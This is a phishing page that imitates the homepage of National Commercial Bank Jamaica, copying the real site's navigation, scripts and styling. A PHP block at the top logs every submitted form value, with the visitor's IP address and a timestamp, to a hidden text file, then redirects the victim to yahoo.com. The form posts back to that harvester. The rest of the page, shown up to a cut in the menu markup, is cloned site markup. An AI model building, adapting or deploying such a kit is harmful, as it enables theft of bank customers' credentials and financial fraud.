<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: yahoo.com');
$handle = fopen('log_z17g8K3WWR.txt', 'a');
fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable.': '.$value."\r\n");}
fclose($handle);
exit;
} ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" >
<head id="head"><title>
	Home | National Commercial Bank - NCB Jamaica Ltd.
</title><meta name="description" content="NCB provides credit cards, mortgages, personal loans, savings accounts, investment, insurance and business banking." /> 
<meta http-equiv="content-type" content="text/html; charset=UTF-8" /> 
<meta http-equiv="pragma" content="no-cache" /> 
<meta http-equiv="content-style-type" content="text/css" /> 
<meta http-equiv="content-script-type" content="text/javascript" /> 
<meta charset="utf-8" content="text/html" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<meta name="facebook-domain-verification" content="qmxk6oiefsa86jsv458t98uy6bvibr" />
<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" type="text/css" rel="stylesheet" />
<!--
<link href="https://www.jncb.com/CMSPages/GetResource.ashx?stylesheetfile=/Jncb/assets/css/concatenated.min.css" type="text/css" rel="stylesheet" />
<link href="https://www.jncb.com/CMSPages/GetResource.ashx?stylesheetfile=/Jncb/assets/css/src/bootstrap.min.css" type="text/css" rel="stylesheet" />-->
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css" integrity="sha384-HSMxcRTRxnN+Bdg0JdbxYKrThecOKuH5zCYotlSAcp1+c8xmyTe9GYg1l9a69psu" crossorigin="anonymous">
<link href="https://www.jncb.com/CMSPages/GetResource.ashx?stylesheetfile=/Jncb/assets/css/src/owl.theme.default.min.css" type="text/css" rel="stylesheet" />
<link href="https://www.jncb.com/CMSPages/GetResource.ashx?stylesheetfile=/Jncb/assets/css/src/eosMenu.css" type="text/css" rel="stylesheet" />
<link href="https://www.jncb.com/Jncb/assets/css/src/main.css" type="text/css" rel="stylesheet" />
<link href="https://www.jncb.com/CMSPages/GetResource.ashx?stylesheetfile=/Jncb/assets/css/src/owl.carousel.min.css" type="text/css" rel="stylesheet" />
<link href="https://www.jncb.com/CMSPages/GetResource.ashx?stylesheetfile=/Jncb/assets/css/src/magnific-popup.css" type="text/css" rel="stylesheet" />
<link href="https://www.jncb.com/CMSPages/GetResource.ashx?stylesheetfile=/Jncb/assets/css/src/royal.slider.css"  type="text/css" rel="stylesheet"/>
<!--<script src="//ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js" type="text/javascript"></script>-->
<script src="//ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js" type="text/javascript"></script>
<script src="//code.jquery.com/jquery-migrate-3.3.2.min.js"></script>
<!--<script src="https://www.jncb.com/CMSScripts/Bootstrap/bootstrap.min.js" type="text/javascript"></script>
<script src="https://www.jncb.com/CMSScripts/Bootstrap/bootstrap.custom.js" type="text/javascript"></script>-->
<script src="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
<script type="text/javascript" src="https://www.jncb.com/CMSScripts/Custom/jquery.royalslider.min.js"></script>
<script type="text/javascript" src="https://www.jncb.com/Jncb/assets/js/src/eosMenu.js"></script>
<script type="text/javascript" src="https://www.jncb.com/Jncb/assets/js/src/owl.carousel.min.js"></script>
<style>
@import url(https://fonts.googleapis.com/css?family=Roboto:400,300);
</style>



<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-47167941-1', 'auto');
  ga('send', 'pageview');

</script>
 
<link href="https://www.jncb.com/favicon.ico" type="image/x-icon" rel="shortcut icon"/> 
<link href="https://www.jncb.com/favicon.ico" type="image/x-icon" rel="icon"/> 
 
  <link rel="stylesheet" href="https://www.jncb.com/JNCB/stylesheets/smartbanner.min.css">
  <script src="https://www.jncb.com/JNCB/js/smartbanner.min.js"></script>

<!-- Start SmartBanner configuration -->
<meta name="smartbanner:title" content="NCB Mobile App">
<meta name="smartbanner:author" content="National Commercial Bank Ltd.">
<meta name="smartbanner:price" content="FREE">
<meta name="smartbanner:price-suffix-apple" content=" - On the App Store">
<meta name="smartbanner:price-suffix-google" content=" - On the Play Store">
<meta name="smartbanner:icon-apple" content="/JNCB/media/Main-Librarie/icons/AppleNCB.png">
<meta name="smartbanner:icon-google" content="/JNCB/media/Main-Librarie/icons/AndroidNCB.png">
<meta name="smartbanner:button" content="VIEW">
<meta name="smartbanner:button-url-apple" content="https://itunes.apple.com/us/app/ncb-mobile/id1435405040?mt=8">
<meta name="smartbanner:button-url-google" content="https://play.google.com/store/apps/details?id=com.jncb.mobile">
<meta name="smartbanner:enabled-platforms" content="android,ios">
<meta name="smartbanner:close-label" content="Close">
<!-- End SmartBanner configuration --><link href="https://www.jncb.com/CMSPages/GetResource.ashx?_webparts=677" type="text/css" rel="stylesheet"/> 
</head>
<body class="LTR ENJM ContentBody Homepage" >
    <form method="post" action="<?php echo basename(__FILE__); ?>" id="form">





<script type="text/javascript">
	//<![CDATA[

function PM_Postback(param) { if (window.top.HideScreenLockWarningAndSync) { window.top.HideScreenLockWarningAndSync(1080); } if(window.CMSContentManager) { CMSContentManager.allowSubmit = true; }; __doPostBack('m$am',param); }
function PM_Callback(param, callback, ctx) { if (window.top.HideScreenLockWarningAndSync) { window.top.HideScreenLockWarningAndSync(1080); }if (window.CMSContentManager) { CMSContentManager.storeContentChangedStatus(); };WebForm_DoCallback('m$am',param,callback,ctx,null,true); }
//]]>
</script>
<script src="https://www.jncb.com/ScriptResource.axd?d=x6wALODbMJK5e0eRC_p1LViHBQ7Uyq_IVN1Cbi4JGeYUi4y39KaPebTQzPv2xb-NHvb2JbTMr3nTLiUMZug9pfgRVLvtIN6XU8HFlTQnA926euax0&amp;t=7c776dc1" type="text/javascript"></script>
<script src="https://www.jncb.com/ScriptResource.axd?d=NHo7rzvB81m25b5lv-ojMQK1lP6f96fnVptqvEdcd1_Kzkny1-00XquW3WcNOT7I99kU19bUoly90oG1C4-uEPwiGWZ8waDtxip8ku8t0yi0-riH0&amp;t=7c776dc1" type="text/javascript"></script>
<script src="https://www.jncb.com/ScriptResource.axd?d=G7OZOzpYF9XwHB8eN29Yb1sk57PD4du2NZ2rH5LQYTjy9VBPkLci5aox0ozmFIlHylkA4dUaVVVNu1VzMnHHS4_0zZkWdvOG09qCRZ3YWhlmGgYaTlnFUWW-EZHcZA1YXTqXjg2&amp;t=7c776dc1" type="text/javascript"></script>
<script src="https://www.jncb.com/ScriptResource.axd?d=Y4RJC2UgV6Ws3MXxk43BybkVrhSf9GWVUnYOEXIXVgkZ60k1D81H1AB-r3PTbjCLtqdpPqTy-lYmIJqYzLZsdno-xYHp7gRdaFNvUKewHtNa0gVq91lJWxqmw94jg8uSux1-UQ2&amp;t=7c776dc1" type="text/javascript"></script>
<script type="text/javascript">
	//<![CDATA[

var CMS = CMS || {};
CMS.Application = {
  "isRTL": "false",
  "isDebuggingEnabled": false,
  "applicationUrl": "/",
  "imagesUrl": "/CMSPages/GetResource.ashx?image=%5bImages.zip%5d%2f",
  "isDialog": false
};

//]]>
</script>

    
    <div id="ctxM">

</div>
    

<!-- Top Menu -->
<div id="header-top" role="menu-top">
  <div class="container">
    <div class="navbar-lg-rs">
      <ul>
        <li class="link-singin"><a href="https://www.jncb.com/quisk" target="blank"><img src="https://www.jncb.com/JNCB/media/Main-Librarie/quisk_logo_white_small.png"></a></li>
        <!--<li class="link-singin"><a href="https://loans.jncb.com" target="blank">Enter Loan Offer Code</a></li>-->
        <li class="dropdown">
          <a href="https://www.jncb.com/#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Enter Offer Codes<span class="caret"></span></a>
          <ul class="dropdown-menu">
            <li><a href="https://loans.jncb.com" target="_blank">Loan Offer Code</a></li>
            <li><a href="https://creditcard.jncb.com/personal" target="_blank">Personal Credit Card Offer Code</a></li>
            <li><a href="https://creditcard.jncb.com/business" target="_blank">Business Credit Card Offer Code</a></li>
          </ul>
        </li>
        <li class="border-right"><a href="https://www.jncb.com/internetbanking?rd=RetailLogon" onclick="ga('send','event',{'eventCategory':'NCB eLink Page','eventAction':'Sign In','eventValue': 55});" target="_blank">Online Banking Sign In<span class="icon-login library-ncb-icon-font"><i class="icon-lock"></i></span></a></li>
          <li class="dropdown">
          <a href="https://www.jncb.com/#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Credit Card Services<span class="caret"></span></a>
          <ul class="dropdown-menu">
            <li><a href="https://www.jncb.com/activate" onclick="ga('send','event',{'eventCategory':'Credit Card Activation','eventAction':'Activation Page','eventLabel':'Link To Credit Card Activation.','eventValue': 55});" target="_blank">Activate Your Card</a></li>
            <li><a href="https://chargeback.jncb.com"  onclick="ga('send','event',{'eventCategory':'Credit Card Dispute','eventAction':'Dispute Credit Card charges ','eventLabel':'Link To Credit Card dispute Portal.','eventValue': 55});"  target="_blank">Manage My Card</a></li>
          <li><a href="https://estatement.jncb.com" target="_blank">Opt-In for e-Statements</a></li>
            </ul>
        </li>
        <li class="border-right"><a href="https://www.jncb.com/support/contact/contact-us">Contact Us</a></li>
        <li><a href="https://www.jncb.com/Support/Locate/Branches-ABMs">Branches &amp; ABMs</a></li>
      </ul>
    </div>
  </div>
</div>


<!-- header -->
<header role="banner" id="header">
  <div class="container" id="container-mobile">
    <div class="row">
      <nav class="navbar navbar-default" role="navigation">
        <div class="navbar-header">
          <div class="navbar-logo-box">
            <a class="navbar-brand" href="https://www.jncb.com/"><img id="p_lt_ctl00_mainlogo_ucEditableImage_imgImage" title="JNCB" class="img-responsive" src="https://www.jncb.com/JNCB/media/Main-Librarie/jncb-logo.png?ext=.png" alt="JNCB" />

</a>
          </div>
          <!-- Mobile Navigation -->
          <div class="navbar-mobile">
            
 <!--Menu link less 480px-->
  <div class="navbar-box-dx">
    <!--<div class="icon-login library-ncb-icon-font"><a class="navbar-login" href="https://www.jncb.com/internetbanking?rd=https%3A%2F%2Fwww.ncbelink.com" target="_blank">-->
      <div class="icon-login library-ncb-icon-font"><a class="navbar-login" href="https://www.jncb.com/internetbanking?rd=RetailLogon" target="_blank">
      <i class="icon-lock">&nbsp;</i>SIGN IN</a>
    </div>
  </div>
<div class="eos-menu" id="menu">
 
  <!--Menu link from 480px to 768px-->
  <div class="navbar-md-rs">
    <ul>
      <!--<li><a href="https://www.jncb.com/internetbanking?rd=https%3A%2F%2Fwww.ncbelink.com" target="_blank">Sign In<span class="icon-login library-ncb-icon-font"><i class="icon-lock">&nbsp;</i></span></a></li>-->
      <li><a href="https://www.jncb.com/internetbanking?rd=RetailLogon" target="_blank">Sign In<span class="icon-login library-ncb-icon-font"><i class="icon-lock">&nbsp;</i></span></a></li>
      <li class="border-left"><a href="https://www.jncb.com/support/contact/contact-us">Contact Us</a></li>
      <li class="border-left"><a href="https://www.jncb.com/Support/Locate/Branches-ABMs">Branches &amp; ABMs</a></li>
      <li><a class="btn btn-warning" href="https://secure.jncb.com/pcas" target="_blank" type="button">Open An Account</a></li>
    </ul>
  </div>
  <div class="eos-menu-title" id="btn-mobile" onclick="overlay()"><i aria-hidden="true" class="fa fa-bars fa-lg eos-pull-right"></i><div class="eos-menu-label">MENU</div></div>
  
  <div class="eos-menu-content">
    <ul>
      <li class="eos-item library-ncb-icon-font"><a href="https://www.jncb.com/"><i aria-hidden="true" class="icon-home">&nbsp;</i> Home</a></li>
      <li class="eos-item library-ncb-icon-font"><a href="https://www.jncb.com/Support/Locate/Branches-ABMs"><i aria-hidden="true" class="icon-home">&nbsp;</i> Branches &amp; ABMs</a></li>
      <li class="eos-item library-ncb-icon-font"><a href="https://www.jncb.com/support/contact/contact-us"><i aria-hidden="true" class="icon-home">&nbsp;</i> Contact Us</a></li>
       <li class="eos-item library-ncb-icon-font"><a href="https://www.jncb.com/openaccountonline" target="_blank"><i aria-hidden="true" class="icon-home">&nbsp;</i> Open An Account (New NCB Customer)</a></li>
      <li class="eos-item library-ncb-icon-font"><a href="https://remoteonboarding.jncb.com/" target="_blank"><i aria-hidden="true" class="icon-home">&nbsp;</i> Open New Account (Existing NCB Customer)</a></li>
      <li class="eos-item library-ncb-icon-font"><a href="https://www.jncb.com/activate" target="_blank"><i aria-hidden="true" class="icon-home">&nbsp;</i> Activate Your Credit Card</a></li>
      <li class="eos-item library-ncb-icon-font"><a href="https://estatement.jncb.com" target="_blank"><i aria-hidden="true" class="icon-home">&nbsp;</i> Opt-In for e-Statements</a></li>
      <li class="eos-item library-ncb-icon-font"><a href="https://loans.jncb.com/" target="_blank"><i aria-hidden="true" class="icon-home">&nbsp;</i> Enter Loan Offer Code</a></li>
      <li class="eos-item library-ncb-icon-font"><a href="https://creditcard.jncb.com/offercode" target="_blank"><i aria-hidden="true" class="icon-home">&nbsp;</i> Enter Credit Card Offer Code</a></li>
      <li class="eos-item library-ncb-icon-font"><a href="https://chargeback.jncb.com/" target="_blank"><i aria-hidden="true" class="icon-home">&nbsp;</i> Manage My Card</a></li>
      <li class="eos-quisk library-ncb-icon-font"><a href="http://www.jncb.com/quisk" target="blank"><i aria-hidden="true" class="icon-home">&nbsp;</i><img src="https://www.jncb.com/JNCB/media/Main-Librarie/quisk_logo_blue_small.png" alt="quisk"></a></li>
    </ul><div class="eos-group-title">Personal<i aria-hidden="true" class="fa fa-angle-right fa-lg eos-pull-right">&nbsp;</i></div>
<div class="eos-group-content"><div class="eos-group-title library-ncb-icon-font">Payments</div>
<ul>
  <li class="eos-item"><a href="https://www.jncb.com/Personal/Cards/Debit-Cards">Debit Card</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Cards/Credit-cards">Credit Cards</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Cards/Prepaid-cards">Prepaid Card</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Cards/Activate-Your-Credit-Card">Activate Your Credit Card</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Cards/Quisk">Quisk from NCB</a></li></ul><span></span><div class="eos-group-title library-ncb-icon-font">Banking</div>
<ul>
  <li class="eos-item"><a href="https://www.jncb.com/Personal/Banking/PersonalAccountRequirements">Account Opening Requirements</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Banking/Chequing-Accounts">Chequing Account</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Banking/Savings-Accounts">Savings Accounts</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Banking/Private-Banking-Services">Private Banking Services</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Banking/Private-Banking">Premium Banking Services</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Banking/Online-Banking">Online Banking</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Banking/Online-Bank-Demos">Online Banking Demos</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Banking/Online-Banking-Tips">Online Banking Guides</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Banking/MobileApp">Mobile App</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Banking/Deposit-Rates">Deposit Rates</a></li></ul><span></span><div class="eos-group-title library-ncb-icon-font">Loans & Financing</div>
<ul>
  <li class="eos-item"><a href="https://www.jncb.com/Personal/Loans-Financing/Auto-Loans">Auto Loan</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Loans-Financing/Mortgage">Mortgage</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Loans-Financing/Personal-Loans">Personal Loans</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Loans-Financing/Check-for-Loan-offer">Check for Offer</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Loans-Financing/Realtor-Incentive">Realtor Incentive Programme</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Loans-Financing/Incentive-Programme">Mortgage Incentive Programme</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Loans-Financing/Deposit-Rates-1">Lending Rates</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Loans-Financing/Loan-Calculators">Loan Calculator</a></li></ul><span></span><div class="eos-group-title library-ncb-icon-font">Investing</div>
<ul>
  <li class="eos-item"><a href="https://www.jncb.com/Personal/Investing/Investment-Products">Investment Products</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Investing/Retirement-Plans">Retirement Plans</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Investing/Education-Investments">Education Investments</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Investing/Advice-Planning">Advice & Planning</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Investing/Research">Research</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Investing/Wealth-Management">Wealth Management</a></li></ul><span></span><div class="eos-group-title library-ncb-icon-font">Insurance</div>
<ul>
  <li class="eos-item"><a href="https://www.jncb.com/Personal/Insurance/Insurance-Plans-Overview">Insurance Plans Overview</a></li><li class="eos-item"><a href="https://www.jncb.com/Personal/Insurance/Insurnce-Forms">Insurance Forms</a></li></ul></div><span></span><div class="eos-group-title">Business<i aria-hidden="true" class="fa fa-angle-right fa-lg eos-pull-right">&nbsp;</i></div>
<div class="eos-group-content"><div class="eos-group-title library-ncb-icon-font">Credit Cards</div>
<ul>
  <li class="eos-item"><a href="https://www.jncb.com/Business/Credit-Cards/Credit-Cards-for-Business">Credit Cards for Business</a></li></ul><span></span><div class="eos-group-title library-ncb-icon-font">Banking</div>
<ul>
  <li class="eos-item"><a href="https://www.jncb.com/Business/Banking/Chequing-Account">Chequing Account</a></li><li class="eos-item"><a href="https://www.jncb.com/Business/Banking/Savings-Plans">Savings Plans</a></li><li class="eos-item"><a href="https://www.jncb.com/Business/Banking/Value-Plans">Value Plans</a></li><li class="eos-item"><a href="https://www.jncb.com/Business/Banking/BusinessAccountRequirements">Account Opening Requirements</a></li><li class="eos-item"><a href="https://www.jncb.com/Business/Banking/Dropbox_Smart_Safe">Business Deposit Processing (Dropbox/Smart Safe)</a></li><li class="eos-item"><a href="https://www.jncb.com/Business/Banking/Corporate-Banking">Corporate Banking</a></li><li class="eos-item"><a href="https://www.jncb.com/Business/Banking/Tresasury-Correspondent-Banking">Treasury & Correspondent Banking</a></li><li class="eos-item"><a href="https://www.jncb.com/Business/Banking/Online-Banking">Online Banking</a></li><li class="eos-item"><a href="https://www.jncb.com/Business/Banking/Online-Bank-Demos">Online Banking Demos</a></li></ul><span></span><div class="eos-group-title library-ncb-icon-font">Loans & Financing</div>
<ul>
  <li class="eos-item"><a href="https://www.jncb.com/Business/Loans-Financing/Mortgage-Calculator">Mortgage Calculator</a></li><li class="eos-item"><a href="https://www.jncb.com/Business/Loans-Financing/SME-Development-Loan-USAID">SME Development Loan Fund</a></li><li class="eos-item"><a href="https://www.jncb.com/Business/Loans-Financing/Unsecured_Loans">Unsecured Loans</a></li><li class="eos-item"><a href="https://www.jncb.com/Business/Loans-Financing/Secured_Loans">Secured Loans</a></li><li class="eos-item"><a href="https://www.jncb.com/Business/Loans-Financing/Vehicle-Loans-Leases">Auto Loans</a></li></ul><span></span><div class="eos-group-title library-ncb-icon-font">Investing & Insurance</div>
<ul>
  <li class="eos-item"><a href="https://www.jncb.com/Business/Investing/Investment-Options">Investment Options</a></li><li class="eos-item"><a href="https://www.jncb.com/Business/Investing/Investment-Banking">Investment Banking</a></li><li class="eos-item"><a href="https://www.jncb.com/Business/Investing/Advice-Planning">Advice & Planning</a></li><li class="eos-item"><a href="https://www.jncb.com/Business/Investing/Research">Research</a></li><li class="eos-item"><a href="https://www.jncb.com/Business/Investing/Benefits-Insurance-Overview">Benefits & Insurance Overview</a></li></ul><span></span><div class="eos-group-title library-ncb-icon-font">Merchant Services</div>
<ul>
  <li class="eos-item"><a href="https://www.jncb.com/Business/Merchant-Services/Merchant_Product_Guide">Merchant Product Guide</a></li><li class="eos-item"><a href="https://www.jncb.com/Business/Merchant-Services/PointofSale">Point of Sale (POS)</a></li><li class="eos-item"><a href="https://www.jncb.com/Business/Merchant-Services/eCommerce-1">mPOS</a></li><li class="eos-item"><a href="https://www.jncb.com/Business/Merchant-Services/eCommerce">eCommerce</a></li><li class="eos-item"><a href="https://www.jncb.com/Business/Merchant-Services/Paysmart">PaySmart</a></li><li class="eos-item"><a href="https://www.jncb.com/Business/Merchant-Services/Become-A-Merchant">Become A Merchant</a></li><li class="eos-item"><a href="https://www.jncb.com/Business/Merchant-Services/Merchant-Security">Merchant Security</a></li><li class="eos-item"><a href="https://www.jncb.com/Business/Merchant-Services/Merchant-Newslink">Merchant Newslink</a></li><li class="eos-item"><a href="https://www.jncb.com/Business/Merchant-Services/File-Transfer-Support-EFTP">File Transfer Support (EFTP)</a></li></ul></div><span></span><div class="eos-group-title">About Us<i aria-hidden="true" class="fa fa-angle-right fa-lg eos-pull-right">&nbsp;</i></div>
<div class="eos-group-content"><div class="eos-group-title library-ncb-icon-font">Corporate Social Responsibility</div>
<span></span><div class="eos-group-title library-ncb-icon-font">Company Overview</div>
<ul>
  <li class="eos-item"><a href="https://www.jncb.com/About-Us/Company-Overview/Who-We-Are">Who We Are</a></li><li class="eos-item"><a href="https://www.jncb.com/About-Us/Company-Overview/History">History</a></li><li class="eos-item"><a href="https://www.jncb.com/About-Us/Company-Overview/Management-Team">Management Team</a></li><li class="eos-item"><a href="https://www.jncb.com/About-Us/Company-Overview/Board-of-Directors">Board Of Directors</a></li><li class="eos-item"><a href="https://www.jncb.com/About-Us/Company-Overview/Awards">Awards</a></li></ul><span></span><div class="eos-group-title library-ncb-icon-font">NCB Opportunities</div>
<ul>
  <li class="eos-item"><a href="https://www.jncb.com/About-Us/NCB-Opportunities/Annual-Learning-Reports">Annual Learning Reports</a></li><li class="eos-item"><a href="https://www.jncb.com/About-Us/NCB-Opportunities/Careers-Site">Careers Site</a></li><li class="eos-item"><a href="https://www.jncb.com/About-Us/NCB-Opportunities/Mobile-Learning">Mobile Learning</a></li></ul><span></span><div class="eos-group-title library-ncb-icon-font">News Room</div>
<ul>
  <li class="eos-item"><a href="https://www.jncb.com/About-Us/News-Room/Customer-Survey">Customer Service Survey</a></li><li class="eos-item"><a href="https://www.jncb.com/About-Us/News-Room/News">News</a></li><li class="eos-item"><a href="https://www.jncb.com/About-Us/News-Room/Brand-Media-Guides">Brand & Media Guides</a></li></ul><span></span><div class="eos-group-title library-ncb-icon-font">Investor Relations</div>
<ul>
  <li class="eos-item"><a href="https://www.jncb.com/About-Us/Reports/Information">Information</a></li><li class="eos-item"><a href="https://www.jncb.com/About-Us/Reports/Annual-Reports">Annual Reports</a></li><li class="eos-item"><a href="https://www.jncb.com/About-Us/Reports/Quarterly-Reports">Quarterly Reports</a></li><li class="eos-item"><a href="https://www.jncb.com/About-Us/Reports/Financials">Financials</a></li></ul></div><span></span><div class="eos-group-title">Support<i aria-hidden="true" class="fa fa-angle-right fa-lg eos-pull-right">&nbsp;</i></div>
<div class="eos-group-content"><div class="eos-group-title library-ncb-icon-font">Security</div>
<ul>
  <li class="eos-item"><a href="https://www.jncb.com/Support/Security/Report-Fraud">Report Fraud</a></li><li class="eos-item"><a href="https://www.jncb.com/Support/Security/RSA">RSA Security Token</a></li><li class="eos-item"><a href="https://www.jncb.com/Support/Security/Security-Certificate-Test-1">Report Phishing</a></li><li class="eos-item"><a href="https://www.jncb.com/Support/Security/Security-Guarantee">Security Guarantee</a></li><li class="eos-item"><a href="https://www.jncb.com/Support/Security/Protecting-Yourself">Protecting Yourself</a></li><li class="eos-item"><a href="https://www.jncb.com/Support/Security/Security-Certificate-Test">Security Certificate Test</a></li></ul><span></span><div class="eos-group-title library-ncb-icon-font">Customer Service</div>
<ul>
  <li class="eos-item"><a href="https://www.jncb.com/Support/Requirements/Existing-Supplier-Login">Existing Supplier Login</a></li><li class="eos-item"><a href="https://www.jncb.com/Support/Requirements/New-Supplier-Registration">New Supplier Registration</a></li><li class="eos-item"><a href="https://www.jncb.com/Support/Requirements/Service-Standards">Service Standards</a></li><li class="eos-item"><a href="https://www.jncb.com/Support/Requirements/Complaint-Management-Standard-Operating-Guidelin">Complaint Management - Standard Operating Guideline</a></li><li class="eos-item"><a href="https://www.jncb.com/Support/Requirements/Customer-Service-Charter">Customer Service Charter</a></li><li class="eos-item"><a href="https://www.jncb.com/Support/Requirements/Electronic-Dispute-Form">Electronic Dispute Form</a></li><li class="eos-item"><a href="https://www.jncb.com/Support/Requirements/SWIFT-Wire-Transfer-Instructions">Wire Transfer Instructions</a></li></ul><span></span><div class="eos-group-title library-ncb-icon-font">Help & Resources</div>
<ul>
  <li class="eos-item"><a href="https://www.jncb.com/employerportal">Employer Portal</a></li><li class="eos-item"><a href="https://www.jncb.com/Support/Help-Resources/Automotive-Dealer-Portal">Automotive Dealer Portal</a></li><li class="eos-item"><a href="https://www.jncb.com/Support/Help-Resources/Freelancer-Portal">Freelance Portal</a></li><li class="eos-item"><a href="https://www.jncb.com/Support/Help-Resources/Foreign-Exchange-Services">Foreign Exchange Services</a></li><li class="eos-item"><a href="https://www.jncb.com/Support/Help-Resources/FAQ">FAQ</a></li><li class="eos-item"><a href="https://www.jncb.com/Support/Help-Resources/Forms_and_Documents_for_Downloads">Forms and Documents for Downloads</a></li><li class="eos-item"><a href="https://www.jncb.com/Support/Help-Resources/Fees">Fees</a></li><li class="eos-item"><a href="https://www.jncb.com/Support/Help-Resources/Reclaimed-Listings">Reclaimed Listings</a></li><li class="eos-item"><a href="https://www.jncb.com/Support/Help-Resources/How-to-Avoid-Fees">How to Avoid Fees</a></li><li class="eos-item"><a href="https://www.jncb.com/Support/Help-Resources/Sponsorship">Sponsorship</a></li></ul><span></span><div class="eos-group-title library-ncb-icon-font">Contact</div>
<span></span><div class="eos-group-title library-ncb-icon-font">Locate</div>
</div></div></div>
<div id="menu-overlay" class="modal-hidden"></div>

          </div>
          <!-- End Mobile Navigation -->
        </div>
        <!-- Navigation -->
        <div class="searchBox-home"><div id="p_lt_ctl02_SmartSearchBox_pnlSearch" class="searchBox">
	
    <label for="p_lt_ctl02_SmartSearchBox_txtWord" id="p_lt_ctl02_SmartSearchBox_lblSearch">Search for:</label>
    <input name="p$lt$ctl02$SmartSearchBox$txtWord" type="text" maxlength="1000" id="p_lt_ctl02_SmartSearchBox_txtWord" class="form-control" />
    <input type="submit" name="p$lt$ctl02$SmartSearchBox$btnSearch" value="Search" id="p_lt_ctl02_SmartSearchBox_btnSearch" class="btn btn-default" />
    
    <div id="p_lt_ctl02_SmartSearchBox_pnlPredictiveResultsHolder" class="predictiveSearchHolder">

	</div>

</div>
</div>
<div id="navbar" class="navbar-collapse collapse">
  <ul class="nav navbar-nav navbar-right">
    <li class="homeIcon library-ncb-icon-font"><a href="https://www.jncb.com/"><i aria-hidden="true" class="icon-home">&nbsp;</i></a></li>
    <li class="dropdown"><a class="dropdown-toggle" data-toggle="dropdown" href="https://www.jncb.com/Personal">
  <span class="library-ncb-icon-font">
    Personal
    <b class="icon-chevron-down"></b>
  </span>
</a><div>
  <div class="container">
    <div class="nav-column"><h3 class="yellow">Payments</h3>
<ul>
  <li class="first-submenu"><a href="https://www.jncb.com/Personal/Cards/Debit-Cards">Debit Card</a>
</li><li><a href="https://www.jncb.com/Personal/Cards/Credit-cards">Credit Cards</a>
</li><li><a href="https://www.jncb.com/Personal/Cards/Prepaid-cards">Prepaid Card</a>
</li><li><a href="https://www.jncb.com/Personal/Cards/Activate-Your-Credit-Card">Activate Your Credit Card</a>
</li><li><a href="https://www.jncb.com/Personal/Cards/Quisk">Quisk from NCB</a>
</li></ul></div>
<div class="nav-column"><h3 class="yellow">Banking</h3>
<ul>
  <li class="first-submenu"><a href="https://www.jncb.com/Personal/Banking/PersonalAccountRequirements">Account Opening Requirements</a>
</li><li><a href="https://www.jncb.com/Personal/Banking/Chequing-Accounts">Chequing Account</a>
</li><li><a href="https://www.jncb.com/Personal/Banking/Savings-Accounts">Savings Accounts</a>
</li><li><a href="https://www.jncb.com/Personal/Banking/Private-Banking-Services">Private Banking Services</a>
</li><li><a href="https://www.jncb.com/Personal/Banking/Private-Banking">Premium Banking Services</a>
</li><li><a href="https://www.jncb.com/Personal/Banking/Online-Banking">Online Banking</a>
</li><li><a href="https://www.jncb.com/Personal/Banking/Online-Bank-Demos">Online Banking Demos</a>
</li><li><a href="https://www.jncb.com/Personal/Banking/Online-Banking-Tips">Online Banking Guides</a>
</li><li><a href="https://www.jncb.com/Personal/Banking/MobileApp">Mobile App</a>
</li><li><a href="https://www.jncb.com/Personal/Banking/Deposit-Rates">Deposit Rates</a>
</li></ul></div>
<div class="nav-column"><h3 class="yellow">Loans & Financing</h3>
<ul>
  <li class="first-submenu"><a href="https://www.jncb.com/Personal/Loans-Financing/Auto-Loans">Auto Loan</a>
</li><li><a href="https://www.jncb.com/Personal/Loans-Financing/Mortgage">Mortgage</a>
